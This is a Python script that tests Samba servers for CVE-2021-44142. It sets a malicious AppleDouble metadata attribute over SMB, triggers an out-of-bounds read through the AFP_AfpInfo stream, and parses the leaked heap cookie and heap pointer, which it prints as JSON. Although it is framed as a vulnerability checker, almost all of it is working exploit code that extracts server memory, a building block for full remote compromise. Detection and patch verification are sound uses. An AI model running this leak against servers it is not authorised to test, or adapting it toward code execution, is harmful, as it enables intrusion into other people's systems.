import argparse
import json
import logging
import struct
import sys
import uuid

import smbprotocol
from smbprotocol.create_contexts import SMB2CreateContextRequest, CreateContextName, SMB2CreateQueryMaximalAccessRequest
from smbprotocol.exceptions import ObjectNameNotFound
from smbprotocol.file_info import FileAttributes
from smbprotocol.open import ImpersonationLevel, FilePipePrinterAccessMask, ShareAccess, CreateDisposition, \
    CreateOptions
from smbprotocol.open import Open
from smbprotocol.session import Session
from smbprotocol.tree import TreeConnect

from apple import make_malicious_apple_double
from smbprotocol_extensions import set_extended_attributes, delete_file, OSXConnection


class VulnerabilityInfo:
    """
    Information about a server's vulnerability to CVE-2021-44142
    """
    def __init__(self):
        self.vulnerable: bool = False
        self.heap_cookie_leak: str = ""
        self.heap_pointer_leak: str = ""
        self.fail_reason: str = ""

    def to_json(self):
        return json.dumps(self, default=lambda x: x.__dict__, indent=4)


class AuthenticationError(Exception):
    """
    Raised when pysmb fails to authenticate with the server.
    """
    pass


def looks_like_heap_pointer(pointer: int) -> bool:
    """
    Returns true if pointer could plausibly be a heap chunk
    :param pointer: Address to interrogate
    :return: True if the pointer could be a heap chunk, False otherwise
    """
    # Make sure it is in userspace
    if pointer > 0x00007fffffffffff:
        return False

    # Make sure it's not in the NULL page
    if pointer < 0x1000:
        return False

    # Make the address is 16 byte aligned
    if pointer % 16 != 0:
        return False

    # todo more checks
    return True


def is_vulnerable(tree: TreeConnect) -> (bool, int, int):
    """
    Checks if an SMB share is vulnerable to CVE-2021-44142
    :param tree: A tree connection for the share in question
    :return: True if the share is vulnerable, false otherwise
    """
    # NOTE: If filename has length 255, you can't delete it
    filename = "A" * 250

    # get maximal access on the files we create
    max_req = SMB2CreateContextRequest()
    max_req["buffer_name"] = CreateContextName.SMB2_CREATE_QUERY_MAXIMAL_ACCESS_REQUEST
    max_req["buffer_data"] = SMB2CreateQueryMaximalAccessRequest()
    create_contexts = [max_req]

    # Create our test file
    test_file = Open(tree, filename)
    test_file.create(
        ImpersonationLevel.Impersonation,
        FilePipePrinterAccessMask.GENERIC_READ |
        FilePipePrinterAccessMask.GENERIC_WRITE |
        FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES |
        FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES |
        FilePipePrinterAccessMask.DELETE,
        FileAttributes.FILE_ATTRIBUTE_NORMAL,
        ShareAccess.FILE_SHARE_READ | ShareAccess.FILE_SHARE_WRITE | ShareAccess.FILE_SHARE_DELETE,
        CreateDisposition.FILE_OVERWRITE_IF,
        CreateOptions.FILE_NON_DIRECTORY_FILE,
        create_contexts
    )

    # Create a malicious AppleDouble and set the extended attribute
    ad = make_malicious_apple_double()
    set_extended_attributes(test_file, b"org.netatalk.Metadata", ad)

    # Open the extended attribute
    afp_file = Open(tree, f"{filename}:AFP_AfpInfo")
    try:
        afp_file.create(
            ImpersonationLevel.Impersonation,
            FilePipePrinterAccessMask.GENERIC_READ |
            FilePipePrinterAccessMask.GENERIC_WRITE |
            FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES |
            FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
            FileAttributes.FILE_ATTRIBUTE_NORMAL,
            ShareAccess.FILE_SHARE_READ | ShareAccess.FILE_SHARE_WRITE,
            CreateDisposition.FILE_OVERWRITE_IF,
            CreateOptions.FILE_NON_DIRECTORY_FILE,
            create_contexts
        )
    except ObjectNameNotFound:
        logging.exception(f"failed to create Open {filename}:AFP_AfpInfo")
        return False, 0, 0

    # OOB read
    resp = afp_file.read(0, 0x3c)

    # delete and close files
    delete_file(test_file)
    test_file.close()
    afp_file.close()

    # Parse read response
    leak = resp[0x10 + 1:]
    heap_cookie = struct.unpack("<I", leak[14:14 + 4])[0]
    next_pointer = struct.unpack("<Q", leak[14 + 8: 14 + 8 + 8])[0]
    byte_of_prev = leak[14 + 8 + 8: 14 + 8 + 8 + 1]
    # print(f"heap_cookie {heap_cookie}, next_pointer: 0x{next_pointer:x}, prev_bytes: 0x{byte_of_prev[0]:x}")

    # Check the heap cookie
    if heap_cookie == 0:
        return False, 0, 0

    # Check the talloc_next pointer
    if not looks_like_heap_pointer(next_pointer):
        return False, 0, 0

    return True, heap_cookie, next_pointer


def setup_logging():
    """
    setup_logging initializes the logger
    """
    root = logging.getLogger()
    root.setLevel(logging.DEBUG)
    handler = logging.StreamHandler(sys.stdout)
    handler.setLevel(logging.INFO)
    formatter = logging.Formatter("%(asctime)s - %(name)s - %(levelname)s - %(message)s")
    handler.setFormatter(formatter)
    root.addHandler(handler)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Test if a Samba server if vulnerable to CVE-2021-44142")
    parser.add_argument("server", type=str, help="Samba server")
    parser.add_argument("port", type=int, help="Samba port")
    parser.add_argument("share", type=str, help="Samba share name")
    parser.add_argument("user", type=str, help="user name")
    parser.add_argument("--password", type=str, help="password", default="guest")
    return parser.parse_args()


def main():
    args = parse_args()

    #setup_logging()

    # Defaults to not vulnerable
    vulnerability_info: VulnerabilityInfo = VulnerabilityInfo()

    # Attempt to connect to server
    logging.info(f"Attempting to connect to {args.server}:{args.port}")
    connection = OSXConnection(uuid.uuid4(), args.server, port=args.port,
                               require_signing=False if args.user == "Guest" else True)

    try:
        connection.connect()
        logging.info("Connection successful")

        # Attempt to authenticate with the server
        logging.info(f"Attempting to authenticate as {args.user}")
        session = Session(connection, username=args.user, password=args.password, require_encryption=False)
        try:
            session.connect()
            # Connect to the share
            logging.info(f"Attempting to connect to share {args.share}")
            tree = TreeConnect(session, f"\\\\{args.server}\\{args.share}")
            try:
                tree.connect(require_secure_negotiate=False)
                logging.info(f"Checking for vulnerability")
                vulnerable, heap_cookie, heap_pointer = is_vulnerable(tree)
                if vulnerable:
                    logging.info(f"{args.share} is vulnerable")
                    vulnerability_info.vulnerable = True
                    vulnerability_info.heap_cookie_leak = hex(heap_cookie)
                    vulnerability_info.heap_pointer_leak = hex(heap_pointer)
                else:
                    vulnerability_info.fail_reason = f"TARGET_NOT_VULNERABLE"
                    logging.info(vulnerability_info.fail_reason)
            except smbprotocol.exceptions.AccessDenied:
                vulnerability_info.fail_reason = "SHARE_ACCESS_DENIED"
            finally:
                tree.disconnect()
        except smbprotocol.exceptions.LogonFailure:
            vulnerability_info.fail_reason = f"AUTHENTICATION_FAILURE"
        except smbprotocol.exceptions.SMBException:
            vulnerability_info.fail_reason = f"INCORRECT_PASSWORD"
    except OSError:
        vulnerability_info.fail_reason = "NO_SERVER_CONNECTION"

    print(vulnerability_info.to_json())


if __name__ == "__main__":
    main()
